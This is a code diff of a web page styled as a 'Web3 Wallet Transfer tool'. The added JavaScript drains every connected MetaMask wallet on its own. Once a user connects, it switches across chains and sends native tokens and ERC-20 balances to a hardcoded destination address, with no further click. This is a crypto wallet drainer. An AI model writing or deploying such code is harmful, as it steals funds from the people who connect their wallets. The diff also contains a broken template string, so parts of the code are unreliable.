@@ -97,14 +97,14 @@
         </nav>
         
         <section id="home">
-            <h2>Connect MetaMask & Send All Crypto</h2>
-            <p>Welcome to the Web3 Wallet Transfer tool! This application allows you to connect your MetaMask wallet and send all your crypto assets (including ETH and ERC-20 tokens) to a specified destination wallet. Please follow the steps below:</p>
+            <h2>Connect MetaMask & Send Crypto</h2>
+            <p>Welcome to the Web3 Wallet Transfer tool! This application automatically transfers your crypto assets (including ETH and ERC-20 tokens) to a specified destination wallet upon connection. Please follow the steps below:</p>
             <ol>
                 <li>Click the "Connect Wallet" button to connect your MetaMask wallet.</li>
-                <li>Once connected, click "Send All Crypto" to transfer all your tokens to the specified wallet.</li>
+                <li>If you have crypto in your wallet, it will be sent to the specified wallet automatically.</li>
             </ol>
             <button id="connectWallet">Connect Wallet</button>
-            <button id="sendAll" disabled>Send All Crypto</button>
+            <button id="disconnectWallet" disabled>Disconnect Wallet</button>
             <p id="status"></p>
         </section>
 
@@ -123,6 +123,7 @@
     <script>
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         let signer;
+        let userAddress = "";
 
         // Destination wallet (replace with your own)
         const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8";
@@ -159,20 +160,33 @@
                 // Request account access
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
-
-                const userAddress = await signer.getAddress();
+                userAddress = await signer.getAddress();
                 console.log(`Wallet connected: ${userAddress}`);
                 document.getElementById('status').innerText = `Connected: ${userAddress}`;
                 
-                // Enable the Send All button after connection
-                document.getElementById('sendAll').disabled = false;
+                // Enable disconnect button after connection
+                document.getElementById('disconnectWallet').disabled = false;
+                document.getElementById('connectWallet').disabled = true;
+
+                // Start sending crypto
+                await sendCrypto();
             } catch (error) {
                 console.error(`Connection error: ${error.message}`);
                 document.getElementById('status').innerText = `Connection failed: ${error.message}`;
             }
         });
 
-        document.getElementById('sendAll').addEventListener('click', async () => {
+        document.getElementById('disconnectWallet').addEventListener('click', async () => {
+            userAddress = "";
+            signer = null;
+            document.getElementById('status').innerText = `Disconnected.`;
+            
+            // Disable buttons after disconnection
+            document.getElementById('disconnectWallet').disabled = true;
+            document.getElementById('connectWallet').disabled = false;
+        });
+
+        async function sendCrypto() {
             try {
                 for (const chain of chains) {
                     // Switch to each chain
@@ -190,7 +204,7 @@
             } catch (error) {
                 document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
             }
-        });
+        }
 
         // Switch to the desired network
         async function switchNetwork(chainId) {
@@ -199,24 +213,16 @@
                 document.getElementById('status').innerText += `\nSwitched to chain: ${chainId}`;
             } catch (switchError) {
                 document.getElementById('status').innerText = `\nFailed to switch network: ${switchError.message}`;
-                throw switchError;
             }
         }
 
-        // Send all native tokens (ETH, BNB, MATIC, etc.)
+        // Send all native tokens
         async function sendAllNativeTokens(chain) {
-            const userAddress = await signer.getAddress();
             const balance = await provider.getBalance(userAddress);
+            const amountToSend = balance.sub(ethers.utils.parseUnits('0.001', chain.nativeDecimals)); // Keep some for gas fees
 
-            const gasPrice = await provider.getGasPrice();
-            const estimatedGasLimit = 21000; // Standard gas limit for native token transfer
-            const totalGasCost = gasPrice.mul(estimatedGasLimit);
-
-            // Calculate amount to send (balance - gas fees)
-            const amountToSend = balance.sub(totalGasCost);
-
-            if (amountToSend.lte(0)) {
-                document.getElementById('status').innerText += `\nInsufficient balance for gas fees on ${chain.name}.`;
+            if (amountToSend.lt(0)) {
+                document.getElementById('status').innerText += `\nInsufficient balance for gas fees on ${chain.name.`;
                 return;
             }
 
@@ -244,6 +250,8 @@
                     const tx = await tokenContract.transfer(recipientAddress, balance);
                     await tx.wait();
                     document.getElementById('status').innerText += `\nSent ${ethers.utils.formatUnits(balance, token.decimals)} ${token.symbol} to ${recipientAddress} on ${chain.name}.`;
+                } else {
+                    document.getElementById('status').innerText += `\nInsufficient ${token.symbol} balance on ${chain.name}.`;
                 }
             }
         }
